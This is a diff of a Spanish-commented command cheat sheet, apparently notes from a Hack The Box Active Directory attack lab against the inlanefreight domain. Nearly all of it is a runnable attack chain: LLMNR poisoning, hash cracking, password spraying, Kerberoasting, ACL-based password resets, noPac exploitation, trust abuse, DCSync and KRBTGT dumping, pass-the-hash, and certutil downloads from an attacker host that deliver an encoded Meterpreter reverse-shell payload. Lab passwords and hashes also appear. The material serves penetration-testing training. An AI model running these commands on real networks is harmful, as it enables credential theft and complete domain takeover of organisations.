@@ -1,25 +1,5 @@
 nslookup -type=TXT inlanefreight.com  # Consulta los registros TXT del dominio para encontrar información pública (como la flag)
 
-ssh htb-student@STMIP  # Conexión SSH al host de ataque (jump-box) usando las credenciales proporcionadas
-
-sudo nmap -A -v -Pn 172.16.5.5  # Escaneo detallado del DC para identificar servicios, versiones y certificados SSL
-
-sudo nmap -A -Pn -T5 -oG ./nmapOutput 172.16.5.0/23  # Escaneo rápido de todo el subnet y guarda la salida en formato grepable
-
-awk '/1433\/open/ {print $2}' nmapOutput  # Filtra el archivo de Nmap para extraer la IP del host con MSSQL en el puerto 1433
-
-ssh htb-student@STMIP  # Conexión SSH al host de ataque
-
-sudo responder -I ens224  # Inicia Responder para envenenar LLMNR/NBT-NS y capturar hashes NTLMv2
-
-echo "HASH" > capturedHash.txt  # Guarda el hash capturado en un archivo para crackearlo
-
-hashcat -m 5600 -w 3 -O capturedHash.txt /usr/share/wordlists/rockyou.txt.gz  # Crackea el hash NTLMv2 (modo 5600) con el diccionario rockyou
-
-echo "HASH" > wleyCapturedHash.txt  # Guarda el hash del usuario wley en un archivo
-
-hashcat -m 5600 -w 3 -O wleyCapturedHash.txt /usr/share/wordlists/rockyou.txt.gz  # Crackea el hash NTLMv2 del usuario wley
-
 xfreerdp /v:STMIP /u:htb-student /p:Academy_student_AD!  # Conexión RDP al host Windows de ataque
 
 Import-Module .\Inveigh.ps1  # Importa el módulo Inveigh para envenenamiento LLMNR/NBNS desde Windows
@@ -36,23 +16,15 @@ perl -p -i -e 's/\R//g;' svc_qualysCapturedHash.txt  # Elimina caracteres de nue
 
 hashcat -m 5600 -w 3 -O svc_qualysCapturedHash.txt /usr/share/wordlists/rockyou.txt  # Crackea el hash NTLMv2 de svc_qualys
 
-ssh htb-student@STMIP  # Conexión SSH al host de ataque
-
 kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt -t 40  # Enumera usuarios válidos del dominio vía Kerberos sin autenticación
-
-ssh htb-student@STMIP  # Conexión SSH al host de ataque
 
 enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut -f1 -d "]" > validUsers.txt  # Extrae la lista de usuarios del dominio y la guarda en un archivo
 
 kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 validUsers.txt Welcome1  # Realiza password spraying con la contraseña Welcome1 contra los usuarios válidos
 
-xfreerdp /v:STMIP /u:htb-student /p:Academy_student_AD!  # Conexión RDP al host Windows de ataque
-
 Import-Module .\DomainPasswordSpray.ps1  # Importa el módulo DomainPasswordSpray para spraying desde Windows
 
 Invoke-DomainPasswordSpray -Password Winter2022 -Outfile spraySuccess.txt -ErrorAction SilentlyContinue  # Ejecuta password spraying con Winter2022 y guarda los éxitos
-
-ssh htb-student@STMIP  # Conexión SSH al host de ataque
 
 rpcclient -U "" -N 172.16.5.5  # Conexión anónima por RPC al DC para enumerar usuarios y grupos
 
@@ -60,19 +32,7 @@ queryuser 1170  # Consulta el usuario con RID 1170 para obtener su nombre
 
 crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups  # Enumera los grupos del dominio autenticándose con forend
 
-xfreerdp /v:STMIP /u:htb-student /p:Academy_student_AD!  # Conexión RDP al host Windows de ataque
-
-cd C:\Tools\  # Navega al directorio de herramientas
-
-.\SharpHound.exe  # Ejecuta SharpHound para recolectar datos de AD y generar un ZIP para BloodHound
-
-cd .\BloodHound-GUI\  # Navega al directorio de BloodHound
-
-.\BloodHound.exe  # Inicia BloodHound para analizar los datos recolectados
-
 .\Snaffler.exe -d INLANEFREIGHT.LOCAL -s -v -data  # Ejecuta Snaffler para buscar archivos con credenciales en shares
-
-xfreerdp /v:STMIP /u:htb-student /p:Academy_student_AD!  # Conexión RDP al host Windows de ataque
 
 Get-MpComputerStatus  # Consulta el estado de Windows Defender (versión, si está activo, etc.)
 
@@ -80,27 +40,13 @@ net localgroup Administrators  # Enumera los miembros del grupo local Administra
 
 dsquery * -filter "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=2)(adminCount=1)(description=*))" -limit 5 -attr SAMAccountName description  # Busca cuentas deshabilitadas con privilegios admin y descripción (para encontrar la flag)
 
-ssh htb-student@STMIP  # Conexión SSH al host de ataque
-
 GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request  # Solicita TGS para cuentas con SPN (Kerberoasting) usando forend
-
-hashcat -m 13100 -W 3 -O SAPHash.txt /usr/share/wordlists/rockyou.txt --force  # Crackea el TGS-REP (modo 13100) del usuario SAPService
 
 GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/SAPService  # Enumera los SPN y grupos del usuario SAPService
 
-xfreerdp /v:STMIP /u:htb-student /p:Academy_student_AD!  # Conexión RDP al host Windows de ataque
-
 setspn.exe -Q */* | Select-String -Pattern "vmware/inlanefreight.local" -Context 1  # Busca el SPN vmware/inlanefreight.local y muestra la cuenta asociada
 
-cd C:\Tools\  # Navega al directorio de herramientas
-
 .\Rubeus.exe kerberoast /user:svc_vmwaresso /nowrap  # Realiza Kerberoasting contra svc_vmwaresso con Rubeus
-
-sudo hashcat -m 13100 -w 3 -O hash.txt /usr/share/wordlists/rockyou.txt  # Crackea el TGS-REP de svc_vmwaresso
-
-xfreerdp /v:STMIP /u:htb-student /p:Academy_student_AD!  # Conexión RDP al host Windows de ataque
-
-cd C:\Tools\  # Navega al directorio de herramientas
 
 Import-Module .\PowerView.ps1  # Importa PowerView para enumeración de AD
 
@@ -110,21 +56,13 @@ Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}  # Enumera 
 
 Get-DomainObjectAcl -ResolveGUIDs -Identity "GPO Management" | ? {$_.SecurityIdentifier -eq $sid}  # Enumera los derechos de forend sobre el grupo GPO Management (con GUIDs legibles)
 
-xfreerdp /v:STMIP /u:htb-student /p:Academy_student_AD!  # Conexión RDP al host Windows de ataque
-
-cd C:\Tools\  # Navega al directorio de herramientas
-
 $SecPassword = ConvertTo-SecureString 'transporter@4' -AsPlainText -Force  # Crea un objeto SecureString con la contraseña de wley
 
 $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)  # Crea un objeto PSCredential para wley
 
 $damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force  # Crea un SecureString con la nueva contraseña para damundsen
 
-Import-Module .\PowerView.ps1  # Importa PowerView
-
 Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose  # Cambia la contraseña de damundsen usando los privilegios de wley
-
-$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force  # Crea SecureString con la nueva contraseña de damundsen
 
 $Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)  # Crea PSCredential para damundsen
 
@@ -138,12 +76,6 @@ Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname=
 
 hashcat -m 13100 -w 3 -O hash.txt /usr/share/wordlists/rockyou.txt  # Crackea el TGS-REP de adunn
 
-xfreerdp /v:STMIP /u:htb-student /p:Academy_student_AD!  # Conexión RDP al host Windows de ataque
-
-cd C:\Tools\  # Navega al directorio de herramientas
-
-Import-Module .\PowerView.ps1  # Importa PowerView
-
 Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol  # Busca usuarios con "Store password using reversible encryption"
 
 runas /netonly /user:INLANEFREIGHT\adunn powershell  # Abre PowerShell como adunn (para DCSync)
@@ -156,16 +88,6 @@ lsadump::dcsync /user:INLANEFREIGHT\syncron  # Realiza DCSync para syncron y obt
 
 lsadump::dcsync /user:INLANEFREIGHT\khartsfield  # Realiza DCSync para khartsfield y obtiene su hash NTLM
 
-xfreerdp /v:STMIP /u:htb-student /p:Academy_student_AD!  # Conexión RDP al host Windows de ataque
-
-cd C:\Tools\  # Navega al directorio de herramientas
-
-.\SharpHound.exe  # Recolecta datos de AD con SharpHound
-
-cd .\BloodHound-GUI\  # Navega al directorio de BloodHound
-
-.\BloodHound.exe  # Inicia BloodHound para analizar rutas de ataque
-
 ssh htb-student@172.16.5.225  # Conexión SSH al host de ataque desde el Windows
 
 mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth  # Conexión a MSSQL como DAMUNDSEN usando autenticación Windows
@@ -176,19 +98,11 @@ xp_cmdshell type C:\Users\damundsen\Desktop\flag.txt  # Ejecuta comando para lee
 
 MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2  # Query Cypher en BloodHound para encontrar usuarios con derechos CanPSRemote (WinRM)
 
-ssh htb-student@STMIP  # Conexión SSH al host de ataque
-
 cd /opt/noPac/  # Navega al directorio de noPac
 
 sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap  # Explota NoPac (CVE-2021-42278/42287) para obtener shell como administrator en DC01
 
 type C:\Users\Administrator\Desktop\DailyTasks\flag.txt  # Lee la flag en el escritorio del Administrator
-
-xfreerdp /v:STMIP /u:htb-student /p:Academy_student_AD!  # Conexión RDP al host Windows de ataque
-
-cd C:\Tools\  # Navega al directorio de herramientas
-
-Import-Module .\PowerView.ps1  # Importa PowerView
 
 Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol  # Busca usuarios con "Password not required"
 
@@ -198,17 +112,9 @@ Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,use
 
 hashcat -m 18200 hash.txt -w 3 -O /usr/share/wordlists/rockyou.txt  # Crackea el hash AS-REP (modo 18200)
 
-xfreerdp /v:STMIP /u:htb-student /p:Academy_student_AD!  # Conexión RDP al host Windows de ataque
-
-cd C:\Tools\  # Navega al directorio de herramientas
-
-Import-Module .\PowerView.ps1  # Importa PowerView
-
 Get-DomainTrustMapping  # Enumera las relaciones de confianza entre dominios
 
 xfreerdp /v:STMIP /u:htb-student_adm /p:HTB_@cademy_stdnt_admin!  # Conexión RDP con credenciales de admin al host de ataque
-
-Import-Module .\PowerView.ps1  # Importa PowerView
 
 Get-DomainSID  # Obtiene el SID del dominio hijo (LOGISTICS)
 
@@ -218,21 +124,11 @@ Get-DomainObject -Identity "Enterprise Admins" -Domain INLANEFREIGHT.LOCAL | sel
 
 cat \\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\c$\ExtraSids\flag.txt  # Lee la flag en el DC del dominio padre
 
-ssh htb-student@STMIP  # Conexión SSH al host de ataque
-
 raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm  # Explota la confianza hijo→padre automáticamente y ejecuta PSEXEC en el DC padre
 
 secretsdump.py inlanefreight.local/administrator@172.16.5.5 -hashes aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf -just-dc | grep bross  # DCSync para obtener el hash NTLM del usuario bross
 
-xfreerdp /v:STMIP /u:htb-student /p:Academy_student_AD!  # Conexión RDP al host Windows de ataque
-
-cd C:\Tools\  # Navega al directorio de herramientas
-
 .\Rubeus.exe kerberoast /domain:freightlogistics.local /user:mssqlsvc /nowrap  # Kerberoasting cross-forest contra mssqlsvc en el dominio freightlogistics.local
-
-hashcat -m 13100 -w 3 -O hash.txt /usr/share/wordlists/rockyou.txt  # Crackea el TGS-REP de mssqlsvc
-
-ssh htb-student@STMIP  # Conexión SSH al host de ataque
 
 GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT/wley  # Enumera cuentas con SPN en el dominio de confianza (cross-forest)
 
@@ -280,8 +176,6 @@ certutil.exe -f -urlcache -split http://PWNIP:PWNPO/PowerView.ps1 PowerView.ps1 
 
 powershell  # Inicia PowerShell en el host comprometido
 
-Import-Module .\PowerView.ps1  # Importa PowerView
-
 Get-DomainUser * -SPN | select samaccountname  # Enumera usuarios con SPN (Kerberoastables)
 
 Get-DomainUser -identity svc_sql | get-domainspnticket -format hashcat  # Solicita el TGS de svc_sql en formato Hashcat
@@ -308,8 +202,6 @@ use auxiliary/server/socks_proxy  # Carga el módulo SOCKS proxy para pivotar
 
 show options  # Muestra las opciones del proxy
 
-run  # Inicia el proxy SOCKS en el puerto 1080
-
 sudo nano /etc/proxychains.conf  # Edita la configuración de ProxyChains para añadir el proxy SOCKS
 
 sudo proxychains cme smb 172.16.6.50 -u svc_sql -p lucky7  # Verifica acceso SMB al host interno 172.16.6.50 como svc_sql
@@ -317,8 +209,6 @@ sudo proxychains cme smb 172.16.6.50 -u svc_sql -p lucky7  # Verifica acceso SMB
 sudo proxychains cme smb 172.16.6.50 -u svc_sql -p lucky7 -x "type C:\users\administrator\desktop\flag.txt"  # Ejecuta un comando remoto para leer la flag en el host interno
 
 proxychains crackmapexec smb 172.16.6.50 -u svc_sql -p lucky7 --lsa  # Dumpea secretos LSA (credenciales en claro) del host interno
-
-Import-Module .\PowerView.ps1  # Importa PowerView en el host comprometido
 
 $sid = Convert-NameToSid tpetty  # Convierte el nombre tpetty a su SID
 
@@ -329,10 +219,6 @@ proxychains sudo secretsdump.py INLANEFREIGHT/tpetty@172.16.6.3 -just-dc-user ad
 proxychains wmiexec.py administrator@172.16.6.3 -hashes aad3b435b51404eeaad3b435b51404ee:27dedb1dab4d8545c6e1c66fba077da0  # Se conecta al DC usando Pass-the-Hash como Administrator
 
 hostname  # Confirma el nombre del host (DC01)
-
-type C:\users\administrator\desktop\flag.txt  # Lee la flag en el escritorio del Administrator en DC01
-
-ssh htb-student@STMIP  # Conexión SSH al host de ataque
 
 sudo responder -I ens224 -wrfv  # Inicia Responder para envenenar y capturar hashes NTLMv2
 
@@ -346,8 +232,6 @@ nmap -A 172.16.7.50  # Escaneo detallado del host 172.16.7.50 (MS01)
 
 xfreerdp /v:172.16.7.50 /u:AB920 /p:weasal /drive:share,/home/htb-student/Desktop /dynamic-resolution  # Conexión RDP a MS01 con redirección de directorio para transferir archivos
 
-wget -q https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1  # Descarga PowerView en el host de ataque
-
 wget -q https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_amd64.exe  # Descarga Kerbrute para Windows en el host de ataque
 
 scp PowerView.ps1 htb-student@STMIP:/home/htb-student/Desktop  # Transfiere PowerView al jump-box
@@ -357,8 +241,6 @@ scp kerbrute_windows_amd64.exe htb-student@STMIP:/home/htb-student/Desktop  # Tr
 cd .\Desktop\  # Navega al escritorio en MS01
 
 Set-ExecutionPolicy Bypass -Scope Process  # Permite ejecutar scripts PowerShell sin restricciones
-
-Import-Module .\PowerView.ps1  # Importa PowerView
 
 Get-DomainUser * | Select-Object -ExpandProperty samaccountname | Foreach {$_.TrimEnd()} |Set-Content adusers.txt  # Genera una lista de todos los usuarios del dominio
 
@@ -378,15 +260,11 @@ cd C:\users\AB920\Desktop  # Navega al escritorio de AB920
 
 mssqlclient.py netdb:D@ta_bAse_adm1n\!@172.16.7.60  # Conexión a MSSQL en SQL01 con las credenciales encontradas
 
-enable_xp_cmdshell  # Habilita xp_cmdshell para ejecutar comandos del sistema
-
 xp_cmdshell whoami /priv  # Enumera los privilegios del usuario de SQL Server (para escalar)
 
 wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe  # Descarga PrintSpoofer para escalar privilegios (SeImpersonate)
 
 scp PrintSpoofer64.exe htb-student@STMIP:/home/htb-student/Desktop  # Transfiere PrintSpoofer al jump-box
-
-python3 -m http.server PWNPO  # Inicia un servidor web para transferir PrintSpoofer al host SQL
 
 xp_cmdshell certutil -urlcache -split -f "http://172.16.7.240:9000/PrintSpoofer64.exe" c:\windows\temp\PrintSpoofer64.exe  # Descarga PrintSpoofer en SQL01 usando certutil
 
@@ -402,27 +280,13 @@ exit  # Sale de smbclient
 
 cat flag.txt  # Muestra la flag descargada
 
-sudo msfconsole -q  # Inicia Metasploit
-
-search web_delivery  # Busca el módulo web_delivery
-
-use 1  # Selecciona el módulo
-
-set payload windows/x64/meterpreter/reverse_tcp  # Configura el payload Meterpreter
-
-set TARGET 2  # Selecciona el target PowerShell
-
 set SRVHOST 172.16.7.240  # Configura el servidor web (jump-box) para servir el payload
 
 set LHOST 172.16.7.240  # Configura el listener en la jump-box
 
-exploit  # Ejecuta el módulo y genera el comando PowerShell ofuscado
-
 xp_cmdshell c:\windows\temp\PrintSpoofer64.exe -c "powershell.exe -nop -w hidden -e <PAYLOAD>"  # Ejecuta el payload como SYSTEM vía PrintSpoofer en SQL01
 
 sessions -i 1  # Interactúa con la sesión de Meterpreter
-
-shell  # Abre una shell de comandos
 
 whoami  # Confirma que se ejecuta como SYSTEM
 
@@ -431,10 +295,6 @@ cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe mimikatz64.exe  # Copi
 scp mimikatz64.exe htb-student@STMIP:/home/htb-student/Desktop  # Transfiere mimikatz al jump-box
 
 upload mimikatz64.exe  # Sube mimikatz al host SQL01 vía Meterpreter
-
-shell  # Abre una shell
-
-mimikatz64.exe  # Inicia mimikatz
 
 privilege::debug  # Habilita privilegios de depuración en mimikatz
 
@@ -446,10 +306,6 @@ xfreerdp /v:172.16.7.50 /u:mssqlsvc /p:'Sup3rS3cur3maY5ql$3rverE' /dynamic-resol
 
 wget -q https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1 && scp Inveigh.ps1 htb-student@STMIP:/home/htb-student/Desktop  # Descarga y transfiere Inveigh al jump-box
 
-Import-Module .\Inveigh.ps1  # Importa Inveigh en MS01
-
-Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y  # Inicia Inveigh para capturar hashes NTLMv2 en MS01
-
 hashcat -m 5600 CT059_hash /usr/share/wordlists/rockyou.txt.gz  # Crackea el hash NTLMv2 del usuario CT059
 
 xfreerdp /v:172.16.7.50 /u:CT059 /p:charlie1 /dynamic-resolution  # Conexión RDP a MS01 como CT059 (usuario con GenericAll sobre Domain Admins)
@@ -457,7 +313,5 @@ xfreerdp /v:172.16.7.50 /u:CT059 /p:charlie1 /dynamic-resolution  # Conexión RD
 net user administrator Welcome1 /domain  # Cambia la contraseña del Administrator del dominio (abuso de GenericAll)
 
 wmiexec.py administrator@172.16.7.3  # Se conecta al DC01 como Administrator con la nueva contraseña
-
-type C:\Users\administrator\desktop\flag.txt  # Lee la flag en el DC01
 
 secretsdump.py administrator@172.16.7.3 -just-dc-user KRBTGT  # DCSync para obtener el hash NTLM del KRBTGT (compromiso total del dominio)
